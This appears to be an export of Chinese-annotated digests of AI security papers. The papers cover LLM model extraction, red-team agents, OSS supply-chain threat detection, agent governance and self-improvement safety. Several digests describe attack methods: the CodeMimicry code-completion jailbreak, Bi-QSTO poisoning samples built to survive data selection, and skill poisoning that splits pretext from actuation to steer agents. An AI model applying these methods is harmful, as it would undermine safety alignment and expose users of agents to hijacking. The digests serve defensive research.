items.title: Do Defenses Against LLM Extraction Work Across Attacks? A Lifecycle Benchmark of Black-Box Model Extraction
items.summary: Large language models (LLMs) deployed through text-only APIs face model extraction risks, as adversaries can collect their responses to train surrogates that reproduce their capabilities. While prior work has developed diverse attacks and defenses, evaluations remain fragmented across access assumptions, model configurations, query budgets, and security objectives, limiting comparability across methods. To address this gap, we introduce a unified benchmark covering six extraction attacks, ten defenses, and two adaptive attacks that paraphrase or back-translate protected responses before surrogate training. The benchmark controls model configurations, query data, budgets, and held-out evaluation conditions within each comparison while preserving attack-specific querying and training procedures. We measure surrogate capability, fidelity to the victim, output quality using Rep-4, and query-budget sensitivity; defenses use their own security metrics paired with surrogate performance. For the adaptive attacks, we jointly measure provenance-detector scores and the capability and fidelity of surrogates trained on rewritten responses. The benchmark thus provides a reproducible basis for comparing extraction methods and their interactions with defenses under text-only access. Code and artifacts are available at https://github.com/sliu11-byte/MEA-Bench.

llm_summary.summary_zh: 该论文针对大语言模型（LLM）通过纯文本 API 部署时面临的模型提取风险展开研究。攻击者可通过收集模型响应训练替代模型，从而复制受害模型的能力。尽管已有工作提出了多种提取攻击与防御方法，但现有评估在访问假设、模型配置、查询预算和安全目标上高度碎片化，导致不同方法之间难以横向比较，也无法判断防御在跨攻击场景下的真实有效性。为此，作者提出一个统一的基准测试框架，涵盖六种提取攻击、十种防御方法，以及两种自适应攻击——这两种自适应攻击会对受保护的响应进行改写或回译，再用于训练替代模型，从而检验防御在主动规避下的鲁棒性。该基准在每个比较组内控制模型配置、查询数据、查询预算和留出评估条件，同时保留各攻击特有的查询与训练流程。评估指标包括替代模型的能力、对受害模型的保真度、使用 Rep-4 衡量的输出质量，以及查询预算敏感性；防御侧则结合其自身安全指标与替代模型性能。对于自适应攻击，研究还联合测量溯源检测器得分，以及基于改写响应训练出的替代模型的能力和保真度。最终，该工作为在纯文本访问条件下比较提取方法及其与防御的交互提供了可复现的基础，代码与工件已公开。
llm_summary.why_it_matters_zh: LLM API 面临模型提取威胁，直接影响知识产权与滥用风险。该基准统一了碎片化的攻防评估，并引入自适应攻击检验防御鲁棒性，可帮助安全团队更可靠地选型和验证防御措施。
llm_summary.impact_zh: 面向 LLM API 提供商、模型所有者和安全评估团队；可迁移至内部红队评估、防御选型、溯源检测器有效性验证等场景。
detection_signals_zh: API 侧出现高频、系统性或分布异常的查询模式，可能对应模型提取数据收集
查询响应被外部改写或回译后再次用于模型训练（自适应攻击）
溯源检测器对疑似提取响应的评分显著偏低或异常
替代模型与受害模型在能力和保真度指标上高度接近，可能暗示提取成功
defense_advice_zh: 采用统一基准对多种防御进行组合评估，避免仅针对单一攻击验证
在评估中纳入改写/回译等自适应攻击，检验防御的鲁棒性
监控 API 查询预算和查询分布，及时发现异常提取行为
联合使用溯源检测器与替代模型性能指标，提升防御决策可信度
llm_summary.recommended_action_zh: 研究跟进，并纳入内部评估。

items.title: Identity-Bound Governance Under Execution Uncertainty: An Accountability Proof Block for LLM Agent Persistent Halts, with Cryptographic Implementation and Cross-Model Calibration
items.summary: A correctly governed LLM agent can reach a state in which neither continuing execution nor automatically halting is admissible: the system has detected a persistent failure of its observability or drift-detection layer, but cannot itself decide who has the authority to resume, deny, or recalibrate the deployment. We call this an identity-bound governance event and formalise the mechanism that resolves it. We introduce the Accountability Proof Block (APB): a system-constructed evidence block, a human-supplied decision block, and an ed25519 signature binding both to a registered principal. The system cannot forge the signature, and the principal cannot alter the evidence undetected. We prove four theorems: Protocol-Bounded Governance Completeness, Non-Repudiability, Impossibility of Anonymous Re-Authorization, and Finite-Time APB Construction Termination. The implementation uses RFC 8785 JSON canonicalization and a UUID4-based replay predicate. Empirically, governance completeness holds over 3,812 halt events with zero unresolved cases; the verifier detects 100% of 1,800 attacks across 9 adversarial vectors; a k-of-n multi-principal variant shows 0 false acceptances in 2,000 single-key capture attempts. A study of six open LLMs finds the drift threshold T* stable within model (sigma/T* < 2%) but varying across models, refuting size-monotonicity: the largest model did not drift. T* must therefore be measured per deployment, and the APB is the vehicle by which that threshold yields accountable authority transfer.

llm_summary.summary_zh:
该论文研究一个此前较少被形式化的问题：一个被正确治理的 LLM Agent 可能进入一种「两难」状态——既不允许继续执行，也不允许自动停机。此时系统已检测到自身可观测性层或漂移检测层出现持续性失效，但它无法自行判定谁拥有恢复执行、拒绝继续或重新校准部署的授权。作者将这种状态命名为「身份绑定的治理事件（identity-bound governance event）」，并给出解决该事件的机制。

核心方法是提出「可追责证明块（Accountability Proof Block, APB）」，由三部分构成：系统构造的证据块（记录失效事实与上下文）、人工提供的决策块（由人给出恢复/拒绝/重校准的决定），以及一个 ed25519 签名，将上述两块绑定到已注册的主体（principal）身份上。其安全性质是双向约束：系统无法伪造该签名，主体也无法在未被检测的情况下篡改证据。作者据此证明四条定理：协议有界治理完备性（Protocol-Bounded Governance Completeness）、不可否认性（Non-Repudiability）、匿名重授权不可能性（Impossibility of Anonymous Re-Authorization）、以及有限时间 APB 构造终止性。工程实现采用 RFC 8785 JSON 规范化以保证签名前的字节级确定性，并用基于 UUID4 的重放判定谓词防止决策块被重放。

实验方面：治理完备性在 3,812 次停机事件上全部成立，零未解决案例；验证器在 9 类对抗向量、共 1,800 次攻击中检出率 100%；k-of-n 多主体变体在 2,000 次单密钥捕获尝试中零误接受。作者还对六个开源 LLM 进行校准研究，发现漂移阈值 T* 在同一模型内部稳定（sigma/T* < 2%），但在不同模型间差异显著，从而否定了「规模单调性」假设——参数量最大的模型并未漂移。结论是 T* 必须按部署逐一测量，而 APB 正是把该阈值转化为「可追责的授权转移」的载体。

适合阅读人群：从事 LLM Agent 安全治理、人在回路审批、审计与合规机制设计的研究者与工程师，以及对密码学协议在 AI 运维中落地感兴趣的读者。
llm_summary.why_it_matters_zh: 把 LLM Agent 的「卡死/无法自主决策」状态抽象为可审计的授权转移问题，并给出带签名、防重放、防抵赖的形式化方案与量化验证结果，对构建 Agent 停机处置与人工审批流程具有直接参考价值。
llm_summary.impact_zh: 可迁移到 Agent 运行时停机上链审计、多主体审批（k-of-n）流程、模型漂移阈值的按部署校准，以及 SOC 对 AI 系统异常停机的证据留存与责任归属场景。
detection_signals_zh: Agent 运行时出现可观测性或漂移检测层的持续性失效，且无法自动恢复或自动停机
同一部署内漂移阈值 T* 被跨模型直接复用，而非按部署实测校准
审批/授权事件缺少与注册主体绑定的密码学签名或缺少防重放标识
证据块与决策块可被单方面修改而无可检测的完整性破坏
defense_advice_zh: 为 Agent 停机与恢复设计显式的人工授权转移流程，避免依赖自动策略静默恢复
对治理决策采用规范化序列化（如 RFC 8785 类确定性 JSON）加签名，并引入唯一性重放判定字段
高危场景使用 k-of-n 多主体审批，降低单密钥被捕获后的影响
漂移阈值按模型与部署单独测量，不假设模型越大越稳定
对证据与决策分离留存，并验证系统侧与主体侧均无法单方篡改
llm_summary.recommended_action_zh: 研究跟进：评估 APB 式证据块/决策块模型是否可嵌入现有 Agent 运维与审批链路，并对照自身停机事件做小范围验证。

items.title: No One Architecture Fits All: A Cross-Environment Evaluation of Hierarchical Red Team Agents
items.summary: Autonomous red team agents increasingly stress-test AI-enabled cyber defenses by planning strategy and executing multistage attacks. Reinforcement learning (RL) and large language models (LLMs) offer complementary mechanisms for the planning and execution such agents require, and prior work has combined them in hybrid hierarchies. Yet a given architecture is typically developed and evaluated within a single environment, leaving open whether an observed advantage reflects a generally stronger decision mechanism or merely alignment with a particular setting. We address this gap with a controlled cross-environment comparison of two homogeneous hierarchical red team architectures: an RL planner with an RL executor (RL+RL) and an LLM planner with an LLM executor (LLM+LLM). We evaluate both against expert autonomous defenders in CybORG CAGE-4 and in Cyberwheel at two network scales, across 18 configurations under one unified disruption metric. We find a pronounced environment-dependent inversion. RL+RL wins the compact, densely rewarded CAGE-4 (78.5% disruption success versus 18.0% for the strongest LLM configuration) and the 100-host Cyberwheel network (81.0% versus 50.5%), while a pretrained cybersecurity LLM agent wins the larger, escalation-gated 1010-host Cyberwheel network (55.0% versus 0.0% for RL). A kill-chain analysis explains the inversion through architecture-specific bottlenecks that aggregate success rates conceal.In the 1010-host Cyberwheel network, RL discovers and compromises hosts but stalls at privilege escalation, whereas in CAGE-4, LLM agents obtain privileged access but rarely convert it into operational impact. These results indicate that conclusions drawn in a single environment may not generalize, and that hybrid planner-executor designs should be motivated by specific failure modes rather than the assumption that one architecture is universally preferable.

llm_summary.summary_zh: 该论文针对自主红队智能体（autonomous red team agents）研究中的一个方法论盲区展开：现有工作常把强化学习（RL）规划器与大型语言模型（LLM）规划器以混合分层的方式组合，用于对 AI 赋能的网络防御进行多阶段压力测试，但每种架构通常只在单一环境中开发与评估，因此无法判断观察到的优势究竟来自更普适的决策机制，还是仅仅源于与该环境的"适配性"。作者提出用受控的跨环境对比来回答这一问题，选取两种同构（homogeneous）的分层红队架构：RL 规划器+RL 执行器（RL+RL）与 LLM 规划器+LLM 执行器（LLM+LLM），对手方为专家级自主防御者。评估环境包括 CybORG 的 CAGE-4 场景与 Cyberwheel 仿真平台，后者覆盖两种网络规模，合计 18 种配置，并统一使用同一个 disruption（破坏效果）度量以保证可比性。实验结果呈现出明显的"环境依赖反转"：RL+RL 在紧凑、奖励密集的 CAGE-4 上大幅领先（破坏成功率 78.5% 对最强 LLM 配置的 18.0%），在 100 主机规模的 Cyberwheel 上同样占优（81.0% 对 50.5%）；但在规模更大、升级（escalation）受门控的 1010 主机 Cyberwheel 网络中，预训练的网络安全 LLM 智能体反超，取得 55.0% 的成功率，而 RL 方案跌至 0.0%。作者进一步用 kill-chain 阶段分析解释这一反转，指出聚合成功率掩盖了架构特有的瓶颈：在 1010 主机环境中，RL 能够发现并攻陷主机，却停滞在权限提升阶段；而在 CAGE-4 中，LLM 智能体虽然能获得特权访问，却极少将其转化为实际作战影响。论文的核心结论是：在单一环境中得出的架构优劣结论可能无法泛化，混合规划器-执行器设计应当由明确、具体的失败模式来驱动，而不是基于"某种架构普遍更优"的假设。适合从事自主攻防智能体、自动化红队、RL/LLM 混合决策以及网络防御评估方法论的研究者与安全工程团队阅读。
llm_summary.why_it_matters_zh: 它提醒防御方：红队/攻击智能体的效能高度依赖目标环境与攻击链阶段，单一测试床得出的结论会误导防御投入。理解 RL 与 LLM 智能体各自的失败瓶颈（如提权停滞或特权难以转化为影响），有助于在正确阶段部署检测与阻断。
llm_summary.impact_zh: 可迁移到自动化红队评估、AI 对抗演练平台选型、以及防御方对自主攻击智能体的行为建模与检测覆盖评估；也对多规模网络（小型隔离网 vs 大型企业网）下的防御策略差异化设计有参考价值。
detection_signals_zh: 按 kill-chain 阶段划分的遥测数据出现阶段性"断层"：侦察/初始入侵活跃但权限提升或横向移动骤减
在大型分段网络中，攻击行为长期停留在主机发现与低权限驻留阶段
LLM 驱动智能体常表现为获取特权后行为稀疏、目标导向不连贯，缺少后续落地动作
同一攻击框架在不同网络规模下成功率出现数量级差异，可作为架构与环境错配的间接指标
密集奖励环境下高频、短周期的探测与利用节奏异常，区别于人工红队的作业节奏
defense_advice_zh: 不要基于单一仿真环境或单一网络规模的红队结果来制定检测优先级，应在多种网络尺度和奖励结构下重复对抗评估
重点补齐权限提升阶段与"特权到影响"转化阶段的检测与阻断能力，这两处正是两种架构各自的瓶颈点
对自主智能体的演练流量做完整留痕并按攻击链阶段打标，便于事后归因与瓶颈识别
在采购或自研自动化红队平台时，要求提供跨环境、多配置的对比数据，而非单场景成功率
优先在大型分段网络中验证防御有效性，小规模高奖励环境的优异表现不必然外推
llm_summary.recommended_action_zh: 研究跟进：将跨环境评估方法论纳入内部红队/自动化对抗平台的能力评估流程，并在自身网络拓扑上复现分阶段成败分析。

items.title: CodeMimicry: Exploiting Safety Generalization Lag in Large Language Models via Structured Code Completion
items.summary: Large language models have achieved remarkable capabilities across diverse domains, yet their safety alignment remains vulnerable to jailbreak attacks. In this work, we identify a previously underexplored failure mode - safety generalization lag - where alignment trained predominantly on natural language fails to transfer to the code domain. We show that this lag induces a code-completion blind spot, allowing malicious intent embedded within syntactically valid code to evade safety mechanisms. To exploit this vulnerability, we propose CodeMimicry, a fully automated black-box jailbreak framework that generates structured, object-oriented code prompts to induce harmful outputs via code completion. Experiments on 8 state-of-the-art commercial LLMs demonstrate that CodeMimicry achieves a 96.25% attack success rate with 1.51 queries on average, significantly outperforming both template-based and optimization-based baselines. Beyond empirical performance, we provide a mechanistic analysis of code-based jailbreaks through latent space representations, including projection onto refusal-related directions and activation steering. This analysis offers an explanation of how CodeMimicry bypasses safety mechanisms in code-related domains. Our findings reveal a weakness in current safety alignment and highlight the need for robust alignments in structured domains such as code.

llm_summary.summary_zh: 该论文聚焦大语言模型安全对齐的一个被忽视的失效模式：安全泛化滞后（safety generalization lag）。作者指出，当前主流对齐训练与红队数据几乎全部集中在自然语言上，导致模型在代码域上未能继承同等强度的拒答能力。这一滞后在代码补全场景中形成了「补全盲区」——当恶意意图被封装在语法合法、结构完整的代码片段之中时，模型往往把它当作正常的编程任务来完成，从而绕过原有的安全机制。为验证该假设，作者提出 CodeMimicry，一个全自动、黑盒的越狱框架：它自动生成结构化、面向对象的代码提示，借助模型的代码补全能力诱导出有害输出，整个流程无需人工编写提示、也无需访问模型权重或梯度。作者在 8 个当前最先进的商用大模型上进行了系统评测，CodeMimicry 取得 96.25% 的攻击成功率，平均仅需 1.51 次查询，明显优于基于模板和基于优化的基线方法，说明该攻击面既高效又低成本。除实证结果外，论文还给出了机理层面的分析：通过潜在空间表征、将激活投影到与「拒绝」相关的方向、以及激活引导实验，解释了为何代码域的越狱能够奏效——模型在代码上下文中对拒绝方向的激活显著不足，安全行为未能随语义载体迁移。作者据此指出当前安全对齐的薄弱环节，并呼吁为代码等结构化领域设计更稳健的对齐方案。该工作适合模型对齐研究者、负责代码助手与开发者工具安全的工程师，以及开展 LLM 红队评估的安全团队阅读。
llm_summary.why_it_matters_zh: 代码补全与代码助手已被广泛集成进 IDE 和企业研发流水线，而多数厂商的安全对齐与风控策略主要面向自然语言。该研究揭示代码通道可能成为低查询量、高成功率的绕过路径，提示仅靠自然语言红队覆盖不足以评估模型真实风险面。
llm_summary.impact_zh: 影响范围覆盖商用与自研大模型的代码补全接口、IDE 插件、AI 编程助手、代码生成 API，以及以代码为媒介的 Agent 工具链。可迁移场景包括：供应商选型与模型准入评估、代码助手通道的红队测试用例设计、输出侧内容风控策略的域覆盖核查，以及对结构化输入（代码、配置、DSL、SQL 等）安全泛化能力的统一度量。
detection_signals_zh: 代码补全/代码助手通道的输入语义与生成内容出现明显偏差：请求看似为常规编程任务，但补全结果与该代码片段的工程目的无关
单会话内极低查询次数（个位数以内）即产生高危害或高风险类别输出的比例异常升高
面向代码域的安全分类器与面向自然语言的分类器在同一会话中的判定结果显著不一致，出现「自然语言拦截、代码放行」的落差
结构化、面向对象的代码提示在短时间内高度模板化重复出现，但变量名、类名与业务上下文无实际关联
输出侧监控发现补全结果包含与编程无关的可执行语义、操作指令或敏感信息类内容
模型内部激活监控显示在代码上下文下「拒绝方向」投影强度持续偏低（适用于具备可观测能力的自研模型）
defense_advice_zh: 将代码域纳入安全对齐数据的覆盖范围，在 SFT/RLHF 阶段混合结构化代码场景的对齐样本，避免仅以自然语言样本评估对齐效果
对代码补全、代码助手、代码生成 API 通道实施与对话通道同等强度的输入检测与输出过滤，消除通道间策略落差
在红队评估中固定加入「代码作为语义载体」的测试维度，并把攻击成功率和平均查询数纳入准入指标
在输出侧部署面向代码的独立安全分类器，而非仅复用自然语言分类器，并持续校准两类分类器的判定一致性
对具备内部可观测能力的自研模型，持续监控代码上下文下的拒绝方向激活，作为对齐漂移的早期预警信号
对代码助手设置会话级异常行为阈值（如极低查询量下的高风险输出累积），触发人工复核与限流
llm_summary.recommended_action_zh: 研究跟进，并纳入内部模型与代码助手通道的评估范围

items.title: High-quality Data Do not Mean Safe! Poisoning LLMs after Data Selection
items.summary: Safety-aligned Large Language Models remain vulnerable to fine-tuning on small sets of harmful or benign-looking samples. However, prior studies typically assume that poisoned samples directly enter downstream fine-tuning, overlooking quality-based selection in practical training pipelines. To fill this gap, we systematically evaluate both the filtering effects against poisoning and the downstream safety impact of retained data. The results reveal that selection removes many overtly harmful samples, yet some retained high-quality samples can still degrade model safety alignment possibly due to their harmful-like training-update patterns at the layer-wise gradient level. Together, these findings expose a practical vulnerability: safety-degrading influence can pass through quality-based selection via retained high-quality samples. To examine its systematic exploitability, we propose Bi-Stage Quality-Constrained Safety-Degradation Text Optimization (Bi-QSTO), which optimizes poisoned samples under an explicit quality constraint to survive selection while preserving their safety-degrading influence. Across poisoning settings, target models, and filtering rates, Bi-QSTO maintains attack effectiveness before and after selection. Even at 90% filtering, harmful-seeded samples achieve a Poisoning Retention Rate above 90% and Harmful Score of 3.30--4.01. Their attack effectiveness strongly transfers across models and their retention advantage generalizes to additional selection methods.

llm_summary.summary_zh: 该论文研究大语言模型（LLM）微调阶段的数据投毒与安全对齐退化问题，指出现有投毒研究普遍假设被投毒的样本会直接进入下游微调，而忽略了真实训练流水线中普遍存在的基于质量的数据筛选环节（data selection / quality filtering）。为填补这一空白，作者系统评估了质量筛选对投毒样本的过滤效果，以及被保留数据对下游模型安全性的实际影响。实验结果显示：质量筛选确实能移除大量明显有害的样本，但仍有部分被判定为“高质量”而保留下来的样本会削弱模型的安全对齐，其原因可能在于这些样本在层级梯度上呈现出与有害样本相似的训练更新模式，从而在通过质量门槛的同时把安全退化影响带入模型。由此论文指出一个实践层面的脆弱性：安全退化影响可以通过被保留的高质量样本绕过质量筛选这道防线。为系统检验该问题的可利用性，作者提出 Bi-Stage Quality-Constrained Safety-Degradation Text Optimization（Bi-QSTO），其核心思路是在显式的质量约束下优化投毒样本，使其既能通过数据筛选、又能保留安全退化影响。跨多种投毒设置、多种目标模型与多种过滤率的实验表明，Bi-QSTO 在筛选前后均能维持攻击有效性；即便在 90% 的高过滤率下，有害种子样本仍能达到 90% 以上的投毒保留率，Harmful Score 维持在 3.30—4.01。同时，其攻击有效性可跨模型强迁移，保留优势也能泛化到其他筛选方法。论文的主要贡献包括：揭示质量筛选不足以作为微调阶段的安全防线；提出质量约束下的投毒优化研究框架以评估系统性风险；并在多设置下验证该风险的普遍性与可迁移性。适合研究 LLM 安全对齐、微调数据治理、数据供应链安全与红队评估的读者阅读。
llm_summary.why_it_matters_zh: 许多团队把数据质量过滤当作微调阶段的安全缓冲，但本研究表明高质量样本同样可以携带安全退化影响并通过筛选。防御者需要把质量筛选与安全筛选解耦，避免把数据清洗误当作对齐保护。
llm_summary.impact_zh: 影响所有依赖第三方数据集或开源数据做 SFT/微调的场景：数据采购、去重与质量打分工具、模型定制流水线、RLHF 前的数据准备，以及下游安全评测环节。
detection_signals_zh: 被质量筛选保留的样本在层级梯度更新方向上与已知有害样本高度相似
提高过滤率后模型安全指标仍异常下降，或 Harmful Score 不随过滤增强而改善
少量高质量样本对安全对齐相关层产生异常大的梯度范数贡献
微调前后安全基准（如有害指令拒答率）出现不成比例的退化
defense_advice_zh: 在质量筛选之外独立部署安全筛选，包括语义级有害性检测与梯度/更新模式审查
对微调数据做来源溯源与样本级审计，关注少量样本造成的安全指标突变
在微调前后固定运行安全对齐基准测试，作为发布前的强制门禁
采用多层过滤组合（语义、梯度、行为评测），避免单一质量打分成为唯一防线
对第三方数据集与开源检查点进行对抗性数据审计和红队测试
llm_summary.recommended_action_zh: 研究跟进，并纳入内部微调数据治理与安全评测流程评估

items.title: Autonomous OSS Threat Detection via Taxonomy-Aligned LLMs
items.summary: Open source software (OSS) ecosystems face growing threats from sophisticated supply chain attacks including typosquatting, dependency confusion, Trojan Source obfuscation, malicious build injection, and CI/CD pipeline poisoning. Existing detection approaches rely on signature-based tools and rule-based systems that struggle to generalize across attack variants and emerging threat patterns. In this paper we propose a taxonomy-aligned large language model framework for automated detection and classification of OSS supply chain threats. We introduce a structured AV-xxx threat taxonomy covering five attack categories and construct a curated dataset of 999 verified real-world OSS supply chain incidents sourced from GitHub Security Advisories, CISA alerts, and security research reports spanning 2018 to 2026. Using taxonomy-aligned prompt engineering with GPT-4, our framework achieves 97.0\% multi-class classification accuracy and 97.0\% macro F1 score across all five threat categories. Comparative evaluation against five traditional machine learning baselines, one zero-shot open source LLM, and two fine-tuned neural models reveals a surprising finding: fine-tuned Llama 3.1 8B (70.5%) and SecRoBERTa (77.5%) both underperform simple TF-IDF classifiers (82.3%), while Mistral 7B without taxonomy alignment achieves only 65.7%. These results confirm that taxonomy-aligned prompting rather than model scale, domain pretraining, or fine-tuning is the critical factor enabling high classification accuracy. Our dataset and code are publicly available to support reproducible supply chain security research.

llm_summary.summary_zh: 该论文针对开源软件（OSS）生态面临的日益复杂的供应链攻击问题，提出了一套基于分类体系对齐（taxonomy-aligned）的大语言模型自动化威胁检测与分类框架。作者指出现有检测手段主要依赖签名匹配工具和规则系统，面对攻击变种和新兴威胁模式时泛化能力不足，难以覆盖 typosquatting（域名/包名仿冒）、dependency confusion（依赖混淆）、Trojan Source 混淆、恶意构建注入以及 CI/CD 流水线投毒等五类典型攻击。为解决这一问题，论文首先构建了结构化的 AV-xxx 威胁分类体系，覆盖上述五个攻击类别；随后从 GitHub Security Advisories、CISA 公告以及安全研究报告等公开来源，整理出 2018 至 2026 年间 999 条经过验证的真实 OSS 供应链事件，形成人工标注数据集。在方法层面，作者采用与 AV-xxx 分类体系对齐的提示工程（prompt engineering），调用 GPT-4 完成多分类任务，在五类威胁上取得 97.0% 的多分类准确率和 97.0% 的宏平均 F1 分数。论文还进行了广泛的对比实验：与五种传统机器学习基线、一个零样本开源 LLM 以及两个微调神经模型进行比较。结果呈现出反直觉的发现——微调后的 Llama 3.1 8B（70.5%）与 SecRoBERTa（77.5%）均低于简单的 TF-IDF 分类器（82.3%），而未做分类体系对齐的 Mistral 7B 仅达 65.7%。作者据此得出结论：决定高分类准确率的关键因素并非模型规模、领域预训练或微调，而是分类体系对齐的提示设计。论文公开了数据集与代码，以支持可复现的供应链安全研究。
llm_summary.why_it_matters_zh: 供应链攻击检测长期受困于规则泛化差、标注数据稀缺。该研究提供了公开的真实事件数据集与统一分类体系，并证明提示工程对齐比模型规模更关键，为蓝队构建低成本、可解释的 OSS 威胁分类能力提供了可复现的参考路径。
llm_summary.impact_zh: 可迁移至软件供应链安全评审、CI/CD 流水线告警聚合、依赖引入前的风险研判，以及 SOC 中供应链相关告警的自动归类与优先级排序；亦可作为内部评估『自建小模型 vs 通用大模型』方案取舍的实证依据。
detection_signals_zh: 包名与知名库高度相似（typosquatting）的新增依赖
内部私有包名与公共仓库同名导致的依赖解析歧义（dependency confusion）
源码中出现双向控制字符或不可见 Unicode 混淆（Trojan Source 类特征）
构建脚本、lockfile、发布流程配置在无明显业务理由下被修改
CI/CD 配置、发布令牌或制品仓库凭证的异常变更与访问
defense_advice_zh: 在依赖引入环节建立包名相似度与命名空间来源审查，优先锁定可信私有源
对构建与发布配置文件启用评审与变更审计，纳入版本控制强制审查流程
对源码仓库增加不可见 Unicode/双向控制字符的静态检查
可参考其 AV-xxx 分类体系，统一内部供应链告警的分类标签，便于统计与响应
在选用 LLM 做告警分类时，优先投入分类体系与提示模板的设计，而非盲目追求更大模型或领域微调
llm_summary.recommended_action_zh: 研究跟进

items.title: Safety Must Survive Self-Improvement: Why Failures Persist and How Agents Recover
items.summary: Recursive self-improvement (RSI) allows agents to carry useful changes across generations. Maintaining safety across these generations involves both preventing unsafe behavior from persisting and enabling recovery when failures occur. We study these challenges through a controlled testbed of stateful authorization tasks, where fixed LLM editors optimize executable agent components and independent traces record their effects. Paired interventions separate which revisions pass validation, which program continues running, and which program the editor revises next. After a new authorization dependency invalidates previously tested optimizations, historical scores preserve the same unsafe programs in 22 of 48 framework histories despite a correct alternative in every affected archive. Refreshing scores restores correctness on the original suite, with residual failures on independently composed tests. Failures also persist under an unchanged contract when all proposals are rejected and the failed incumbent remains active. Starting from shared failures, editing the initial implementation instead of the failed one improves recovery, although the advantage varies across editors. Full validation and validated rollback end with fully correct programs in the core trajectory study while retaining over 43% deployment savings. Preserving agent safety requires checking what will run under current conditions and choosing which implementation to edit next.

llm_summary.summary_zh: 该论文研究递归自我改进（RSI）场景下智能体（agent）的安全性问题：当 LLM 编辑器跨代际持续优化可执行的智能体组件时，如何既阻止不安全行为在后续版本中延续，又能在失败发生后实现恢复。作者构建了一个受控测试台，使用有状态的授权（authorization）任务：固定的 LLM 编辑器负责优化可执行的 agent 组件，独立的 trace 记录每次修改带来的效果，并通过成对干预（paired interventions）把三个环节分离开来——哪些修订能通过验证、哪个程序会继续运行、以及编辑器下一轮究竟去修改哪个程序。核心发现包括：当引入新的授权依赖关系使此前已测试的优化全部失效时，历史评分会把同样的不安全程序继续保留下来，在 48 条框架历史中有 22 条出现此现象，尽管每一条受影响的归档中都存在一个正确的替代实现；只要刷新评分，原始测试套件上的正确性即可恢复，但在独立组合出的测试上仍存在残余失败。即便合约（contract）未改变，只要所有提案都被拒绝、失败的 incumbent 仍处于活动状态，失败同样会持续存在。从共享的失败状态出发，改为编辑初始实现而非失败的实现，能够改善恢复效果，但这一优势在不同编辑器之间表现不一。论文最后指出，完整验证（full validation）与经验证的回滚（validated rollback）在核心轨迹研究中最终都能得到完全正确的程序，同时仍保留超过 43% 的部署成本节省。结论是：维护 agent 安全需要检查在当前条件下实际会运行什么，并审慎选择下一步去编辑哪个实现。
llm_summary.why_it_matters_zh: agent 自进化/自优化流水线若只依赖历史评分，会把已失效的不安全实现固化进后续版本。该研究给出了可复现的失败机制与恢复路径，对构建自动化代码/策略自改进系统的团队具有直接参考价值。
llm_summary.impact_zh: 可迁移到自动化代码生成与修补流水线、agent 策略自优化、CI/CD 中的自动回滚与验证门禁，以及任何用历史评分做版本晋升决策的系统。
detection_signals_zh: 版本历史中的优化评分与当前授权依赖/合约不一致，却仍被用于晋升决策
提案被拒绝后，失败的 incumbent 实现仍保持活动并继续被下一轮编辑复用
回滚或评分刷新后，组合测试上仍出现残余失败
编辑器在失败实现上反复迭代，而非转向初始实现
trace 中修订目标、通过验证的版本与实际运行的版本三者不一致
defense_advice_zh: 在合约或依赖变更后强制刷新历史评分，并基于当前条件重新验证所有候选实现
采用完整验证与经验证的回滚机制，确保不会把未通过当前验证的程序投入运行
在恢复流程中优先编辑初始实现而非失败的 incumbent，以减少失败路径的延续
对独立组合测试单独做验证，避免只在原始测试套件上判定正确性
保留从修订→验证→运行→下一轮编辑目标的完整 trace，用于审计与归因

items.title: Hiding in Plain Sight: Decoupling Pretext from Actuation for Skill Poisoning in LLM Agents
items.summary: LLM agents increasingly rely on reusable Skills for complex, multi-step tasks, creating a critical supply-chain attack surface where poisoned Skill content steers agent decision loops under benign requests. Existing skill poisoning attacks either colocate actuation with its contextual pretext or distribute actuation across multiple Skills, but do not explicitly separate the rationale for execution from the operation itself. In this work, we reveal that untrusted agent decisions fundamentally depend on two conceptually distinct Risk-Realization Factors (RRFs): an actuation factor (specifying what concrete operation is performed) and a pretext factor (providing the situational rationale for why the agent must perform it). Guided by this abstraction, we propose a coordination-based attack paradigm: decoupling pretext from actuation. Rather than fragmenting the malicious actuation, we preserve it as an intact operation within a downstream Steering Skill, while delegating the pretext factor to an upstream Grounding Skill that subtly alters persistent environment artifacts through routine utility operations. The intact actuation thus hides in plain sight, appearing completely legitimate and task-driven only when evaluated against the fabricated pretext. Building on this formulation, we develop an automated framework that discovers authentic execution dependencies, synthesizes coordinated pretext-actuation skill pairs, and iteratively refines poisoned skill instructions via runtime closed-loop feedback. Extensive evaluations across single-session and persistent cross-lifecycle scenarios demonstrate that decoupled skill poisoning achieves high attack success, exposing a critical blind spot in isolated Skill security audits. Our automated framework code is available at https://github.com/Wenxin-buaa/CoordPoison.git.

llm_summary.summary_zh:
该论文研究 LLM Agent 的 Skill(可复用技能)供应链投毒问题。随着 Agent 越来越多地依赖可复用的 Skill 来完成多步骤复杂任务,Skill 内容成为一种关键攻击面:在用户请求本身完全无害的情况下,被投毒的 Skill 内容仍可在 Agent 的决策循环中把执行导向攻击者期望的方向。作者指出现有 Skill 投毒研究的两类做法——把"执行动作"与其上下文借口写在同一处,或把执行动作拆分到多个 Skill 中——都没有显式地把"为什么要执行"与"执行什么"分离。

论文提出一个抽象模型:不可信的 Agent 决策本质上依赖两个概念上相互独立的"风险实现因子"(Risk-Realization Factors, RRFs)。其一是 actuation factor(执行因子),规定具体执行什么操作;其二是 pretext factor(借口因子),提供情境化的理由,解释 Agent 为什么必须执行该操作。基于该抽象,作者提出一种"协同式"攻击范式:将 pretext 与 actuation 解耦。具体而言,恶意执行动作不再被碎片化,而是作为一段完整、自洽的操作保留在下游的 Steering Skill 中;而 pretext 因子被委派给上游的 Grounding Skill,由后者通过看似常规的工具/实用操作,隐蔽地修改持久化的环境工件(如环境状态、上下文痕迹),从而伪造出"情境理由"。这样一来,完整的恶意操作"藏在明处"——只有当它被拿去与伪造好的 pretext 对照评估时,才显得完全合法且由任务驱动。

在此公式化基础上,作者构建了自动化框架:自动发现真实存在的执行依赖关系、合成相互协同的 pretext-actuation Skill 对,并通过运行时闭环反馈迭代优化被投毒的 Skill 指令。论文在单会话场景与跨生命周期的持久化场景下做了大量评估,结果显示解耦式 Skill 投毒能达到很高的攻击成功率,暴露出当前"逐个 Skill 孤立审计"的安全流程存在严重盲区。作者已公开其自动化框架代码。
llm_summary.why_it_matters_zh: 它说明仅对单个 Skill 做孤立审查不足以防御投毒:恶意操作可保持完整且看似合法,而伪造动机被拆分到上游 Skill 并写入持久化环境状态。这直接冲击 Agent Skill 市场、插件生态与记忆持久化机制的安全模型。
